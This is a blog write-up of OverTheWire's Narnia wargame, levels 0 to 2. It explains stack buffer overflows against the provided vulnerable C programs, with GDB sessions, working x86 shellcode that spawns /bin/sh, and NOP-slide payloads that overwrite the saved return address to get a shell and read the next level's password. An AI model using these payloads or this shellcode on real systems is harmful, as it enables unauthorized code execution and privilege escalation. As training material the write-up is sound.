---
title: 'OverTheWire Narnia Writeup'
date: '2017-01-07'
slug: '/narnia-writeup/'
draft: false
description: "Writeup on how to complete OverTheWire's Naria wargame. This wargame focuses on beginner binary exploitations."
tags:
  - Security
  - InfoSec
---

I have recently found an interest in InfoSec and have quickly gravitated towards binary exploitations. In an attempt to learn more about binary exploitations and assembly I have started to work through the Naria wargame challenges on [OverTheWire.org](http://overthewire.org/). These challenges are aimed at those who want to learn more about basic exploitation. Perfect!

After completing a challenge, I will provide the steps I took to solve it. There are many ways each challenge can be completed so please note that my way is not the only - or even best - way to solve each challenge.

## Level 0

```C
// narnia0.c

#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef)
        system("/bin/sh");
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

The goal of this level is to change `val`'s value from `0x41414141` to `0xdeadbeef` so the binary will spawn a shell. In the source code, we see that we are only setting `buf`'s value with the user's input. So how can we overwrite `val`? `buf` is defined as being 20 bytes in length. If we attempt to fill `buf` with greater than 20 bytes of data we will overflow into a higher memory address, which happens to belong to `val`. Let's try it.

```sh
narnia0@melinda:/narnia$ python -c 'print "A"*20 + "B"*4' | ./narnia0
Correct vals value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
val: 0x42424242
WAY OFF!!!!
```

Notice `val` was overwritten with `0x42424242`. This is the hexadecimal equivalent of "BBBB". All we need to do now is overwrite `val` with `0xdeadbeef` instead of `0x42424242`.

```sh
narnia0@melinda:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
Correct vals value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
val: 0xdeadbeef
```

We have changed up our Python print command to add `\xef\xbe\xad\xde` to the end of the input string instead of "BBBB". Note that the string is `\xef\xbe\xad\xde` and not `\xde\xad\xbe\xef`. This is because our computer stores memory in **little-endian** format. So we see `val` has been overwritten with `0xdeadbeef`, but where's our shell? Looks like it opened and closed before we got a chance to enter any commands. Let's modify our input to account for this.

```sh
narnia0@melinda:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0
Correct vals value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
**********
```

BAM! We've successfully retrieved the password to ssh into the next level (I've replaced the password with ****\*\***** so as to not spoil things.)

## Level 1

```C
// narnia1.c

#include <stdio.h>

int main(){
	int (* ret)();

	if(getenv("EGG")==NULL){
		printf("Give me something to execute at the env-variable EGG\n");
		exit(1);
	}

	printf("Trying to execute EGG!\n");
	ret = getenv("EGG");
	ret();

	return 0;
}
```

This level is pretty straight forward. The program looks for an environment variable called `EGG` and executes its contents. Let's give it some shellcode to execute.

```sh
 export EGG=$(python -c'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
```

We've now placed the shellcode in the `EGG` environment variable. Time to execute the the binary.

```sh
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
**********
```

## Level 2

```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
	char buf[128];

	if(argc == 1){
		printf("Usage: %s argument\n", argv[0]);
		exit(1);
	}
	strcpy(buf,argv[1]);
	printf("%s", buf);

	return 0;
}
```

This level's program is extremely simple. It takes a single argument, copies the argument's value into a buffer, and prints the buffer. Using knowledge of stack frames and buffer overflows we should be able to exploit this code to gain root. To complete this level we'll need to use **GBD** to assist us in debugging the binary. Let's start by entering GDB and dumping the assembly code to see what we're working with. Enter `gdb narnia2` to start the debugger.

SIDE NOTE: [DarkDust](http://darkdust.net/files/GDB%20Cheat%20Sheet.pdf) has a great cheat sheet for GDB commands.

```
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804845d <+0>:	push   ebp
   0x0804845e <+1>:	mov    ebp,esp
   0x08048460 <+3>:	and    esp,0xfffffff0
   0x08048463 <+6>:	sub    esp,0x90
   0x08048469 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x0804846d <+16>:	jne    0x8048490 <main+51>
   0x0804846f <+18>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048472 <+21>:	mov    eax,DWORD PTR [eax]
   0x08048474 <+23>:	mov    DWORD PTR [esp+0x4],eax
   0x08048478 <+27>:	mov    DWORD PTR [esp],0x8048560
   0x0804847f <+34>:	call   0x8048310 <printf@plt>
   0x08048484 <+39>:	mov    DWORD PTR [esp],0x1
   0x0804848b <+46>:	call   0x8048340 <exit@plt>
   0x08048490 <+51>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048493 <+54>:	add    eax,0x4
   0x08048496 <+57>:	mov    eax,DWORD PTR [eax]
   0x08048498 <+59>:	mov    DWORD PTR [esp+0x4],eax
   0x0804849c <+63>:	lea    eax,[esp+0x10]
   0x080484a0 <+67>:	mov    DWORD PTR [esp],eax
   0x080484a3 <+70>:	call   0x8048320 <strcpy@plt>
   0x080484a8 <+75>:	lea    eax,[esp+0x10]
   0x080484ac <+79>:	mov    DWORD PTR [esp+0x4],eax
   0x080484b0 <+83>:	mov    DWORD PTR [esp],0x8048574
   0x080484b7 <+90>:	call   0x8048310 <printf@plt>
   0x080484bc <+95>:	mov    eax,0x0
   0x080484c1 <+100>:	leave
   0x080484c2 <+101>:	ret
End of assembler dump.
```

We see that the `strcpy` function is at line `main+70.` This is of interest to us. Let's see what the stack looks like just before the next instruction is executed. We can do this by setting a breakpoint with `break *main+75`. Run the program with `run AAAA`. **AAAA** is the argument we provided the program. We will soon look for where that variable is stored in memory to calculate the length of our buffer overflow. GDB will halt the program when it reaches the breakpoint.

```
(gdb) run AAAA
Starting program: /games/narnia/narnia2 AAAA

Breakpoint 1, 0x080484a8 in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd6c0:
 eip = 0x80484a8 in main; saved eip = 0xf7e3cad3
 Arglist at 0xffffd6b8, args:
 Locals at 0xffffd6b8, Previous frame's sp is 0xffffd6c0
 Saved registers:
  ebp at 0xffffd6b8, eip at 0xffffd6bc
```

So we've ran the program and halted at the breakpoint. I've used the `info frame` command to take a deeper look at how the current stack frame is set up. We see that the **Saved EIP** register is located at `0xffffd6bc` and holds a value of `0xf7e3cad3`. The value the EIP register holds is the next instruction to be executed. If we can overwrite this value we can control the flow of the program. Before we can begin doing this let's see where `buf` starts in memory.

```
(gdb) x/20x $esp
0xffffd620:	0xffffd630	0xffffd89f	0x00000000	0x00000000
0xffffd630:	0x41414141	0x00000000	0x002c307d	0x00000000
0xffffd640:	0xffffd6f4	0xffffd668	0xffffd660	0x08048249
0xffffd650:	0xf7ffd938	0x00000000	0x000000bf	0xf7eb7746
0xffffd660:	0xffffffff	0xffffd68e	0xf7e2fc34	0xf7e55fe3
```

We dump 20 bytes of memory in hexadecimal format starting at the stack-pointer using `x/20x $esp`. Look! See that `0x41414141`? That's our `AAAA` input argument we entered when we ran the program. So `buf` must start at `0xffffd630`. Using this knowledge we can calculate the offset between the start of `buf` and the start of our saved EIP.

```
(gdb) print 0xffffd6bc-0xffffd630
$1 = 140
```

They are 140 bytes apart. Let's try to overflow the buffer and overwrite the EIP.

```
(gdb) run `python -c 'print("A"*140 + "B"*4)'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /games/narnia/narnia2 `python -c 'print("A"*140 + "B"*4)'`

Breakpoint 1, 0x080484a8 in main ()
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Segmentation faults are good news. We overwrote the buffer with 140 "A's" which got us just to the start of the EIP. The final 4 "B's" are what we actually overwrote the EIP with. We can see we were successful at this as the program tried to jump to address `0x42424242`, which is `BBBB` in hexadecimal.

Now that we know our input string needs to be 144 bytes in length we can start to construct our exploit. The last four bytes of the string will need to be the return address we want to jump to that will run our shellcode. Speaking of which, we'll also need some shellcode. For this exercise we'll reuse the shellcode from the previous level. Let's calculate the length of the shellcode to see how many bytes we have remaining.

```sh
narnia2@melinda:/narnia$ python -c 'print(len("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"))'
25
```

We could fill the rest of the buffer with "A's" and set the return address to the start of the shellcode but we're going to use a NOP slide for the sake of demonstration. A NOP slide allows us to return to anywhere within the slide and then..._slide_ right into our shellcode. It is called a NOP slide because `x\90` is the NOP, or "No Operation", instruction which does nothing except advance the EIP register. When we hit anywhere within the slide we will just keep advancing until will reach our shellcode. Now we just need to find a suitable return address and we can run our exploit.

```
(gdb) run `python -c 'print("\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "B"*4)'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia2 `python -c 'print("\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "B"*4)'`

Breakpoint 1, 0x080484a8 in main ()
(gdb) x/50x $esp
0xffffd590:	0xffffd5a0	0xffffd812	0x00000000	0x00000000
0xffffd5a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd600:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd610:	0x31909090	0x2f6850c0	0x6868732f	0x6e69622f
0xffffd620:	0x5350e389	0xc289e189	0x80cd0bb0	0x42424242
0xffffd630:	0x00000000	0xffffd6c4	0xffffd6d0	0xf7feacca
0xffffd640:	0x00000002	0xffffd6c4	0xffffd664	0x08049768
0xffffd650:	0x0804821c	0xf7fca000
```

We see our NOP slide represented with all the `0x90909090`'s. Now we just need to take any address in there and use that as the return address. Let's use `0xffffd5e0`.

```sh
narnia2@melinda:/narnia$ ./narnia2 $(python -c 'print("\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\xe0\xd5\xff\xff")')
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
**********
```
